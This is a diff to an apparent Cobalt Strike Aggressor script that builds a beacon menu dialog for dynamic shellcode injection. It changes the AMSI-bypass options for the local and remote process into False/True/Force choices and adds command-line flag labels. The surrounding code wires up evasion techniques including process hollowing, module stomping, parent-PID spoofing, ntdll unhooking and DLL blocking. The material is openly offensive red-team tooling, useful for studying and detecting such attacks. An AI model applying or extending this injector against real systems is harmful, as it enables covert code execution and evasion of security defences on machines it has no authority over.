@@ -65,17 +65,11 @@ sub dinject {
     $cmd .= " /stompDll:"    . %options["stompDll"];
     $cmd .= " /stompExport:" . %options["stompExport"];
     $cmd .= " /sleep:"       . %options["sleep"];
+    $cmd .= " /am51:"        . %options["am51"];
+    $cmd .= " /remoteAm51:"  . %options["remoteAm51"];
 
     if (%options["blockDlls"] eq "true") {
         $cmd .= " /blockDlls:True";
-    }
-
-    if (%options["am51"] eq "true") {
-        $cmd .= " /am51:True";
-    }
-
-    if (%options["remoteAm51"] eq "true") {
-        $cmd .= " /remoteAm51:True";
     }
 
     if (%options["unhook"] eq "true") {
@@ -120,7 +114,7 @@ popup beacon_bottom {
 
         # Setup options values
         %options["staged"]      = "false";
-        %options["exitfunc"]    = "process";
+        %options["exitfunc"]    = "Process";
         %options["technique"]   = "CurrentThread";
         %options["protect"]     = "RX";
         %options["timeout"]     = "0";
@@ -132,8 +126,9 @@ popup beacon_bottom {
         %options["stompDll"]    = "xpsservices.dll";
         %options["stompExport"] = "DllCanUnloadNow";
         %options["blockDlls"]   = "true";
-        %options["am51"]        = "true";
         %options["sleep"]       = "0";
+        %options["am51"]        = "Force";
+        %options["remoteAm51"]  = "Force";
         %options["unhook"]      = "false";
 
         # Create a dialog
@@ -141,12 +136,12 @@ popup beacon_bottom {
 
         dialog_description($dialog, "Perform dynamic shellcode injection using a technique preferrable in current environment. WARNING: the beacon console may be flushed after execution!");
 
-        drow_file($dialog, "custom_shellcode", "Custom shellcode:");
+        drow_file($dialog, "custom_shellcode", "[/sc] Custom shellcode:");
 
         drow_listener_stage($dialog, "listener", "Listener:");
         drow_checkbox($dialog, "staged", "Stage type (beacon payload):", "Use staged payload");
-        drow_combobox($dialog, "exitfunc", "Exit function (staged beacon payload):", @("process",
-                                                                                       "thread"));
+        drow_combobox($dialog, "exitfunc", "Exit function (staged beacon payload):", @("Process",
+                                                                                       "Thread"));
 
         drow_combobox($dialog, "technique", "Injection technique:", @("FunctionPointer",
                                                                       "FunctionPointerUnsafe",
@@ -162,21 +157,27 @@ popup beacon_bottom {
                                                                       "ProcessHollowing",
                                                                       "ModuleStomping"));
 
-        drow_text($dialog, "protect",     "Memory protection for the shellcode (RX / RWX):");
-        drow_text($dialog, "timeout",     "Timeout for WaitForSingleObject in ms (0 is serve forever):");
-        drow_text($dialog, "flipSleep",   "Time to sleep with PAGE_NOACCESS on shellcode in ms (0 disabled):");
-        drow_text($dialog, "image",       "Path to the image of a newly spawned sacrifical process to inject into:");
-        drow_text($dialog, "pid",         "Existing process ID to inject into:");
-        drow_text($dialog, "ppid",        "Parent process ID to spoof the original value with:");
-        drow_text($dialog, "dll",         "Loaded DLL name to overwrite its .text section for storing the shellcode:");
-        drow_text($dialog, "stompDll",    "Name of the DLL to stomp:");
-        drow_text($dialog, "stompExport", "Exported function name to overwrite:");
-        drow_text($dialog, "sleep",       "Number of seconds (approx.) to sleep before execution (10s-60s)");
+        drow_text($dialog, "protect",     "[/protect] Memory protection for the shellcode (RX / RWX):");
+        drow_text($dialog, "timeout",     "[/timeout] Timeout for WaitForSingleObject in ms (0 is serve forever):");
+        drow_text($dialog, "flipSleep",   "[/flipSleep] Time to sleep with PAGE_NOACCESS on shellcode in ms (0 disabled):");
+        drow_text($dialog, "image",       "[/image] Path to the image of a newly spawned sacrifical process to inject into:");
+        drow_text($dialog, "pid",         "[/pid] Existing process ID to inject into:");
+        drow_text($dialog, "ppid",        "[/ppid] Parent process ID to spoof the original value with:");
+        drow_text($dialog, "dll",         "[/dll] Loaded DLL name to overwrite its .text section for storing the shellcode:");
+        drow_text($dialog, "stompDll",    "[/stompDll] Name of the DLL to stomp:");
+        drow_text($dialog, "stompExport", "[/stompExport] Exported function name to overwrite:");
+        drow_text($dialog, "sleep",       "[/sleep] Number of seconds (approx.) to sleep before execution (10s-60s)");
 
-        drow_checkbox($dialog, "blockDlls",  "DLLs:",          "Block 3rd-party DLLs");
-        drow_checkbox($dialog, "am51",       "AMSI (local):",  "Bypass AMSI in current process");
-        drow_checkbox($dialog, "remoteAm51", "AMSI (remote):", "Bypass AMSI in remote process");
-        drow_checkbox($dialog, "unhook",     "Unhook:",        "Unhook ntdll.dll");
+        drow_combobox($dialog, "am51", "[/am51] AMSI (local):", @("False",
+                                                                  "True",
+                                                                  "Force"));
+
+        drow_combobox($dialog, "remoteAm51", "[/remoteAm51] AMSI (remote):", @("False",
+                                                                               "True",
+                                                                               "Force"));
+
+        drow_checkbox($dialog, "blockDlls", "[/blockDlls] DLLs:", "Block 3rd-party DLLs");
+        drow_checkbox($dialog, "unhook",    "[/unhook] Unhook:",  "Unhook ntdll.dll");
 
         dbutton_action($dialog, "Inject");
 
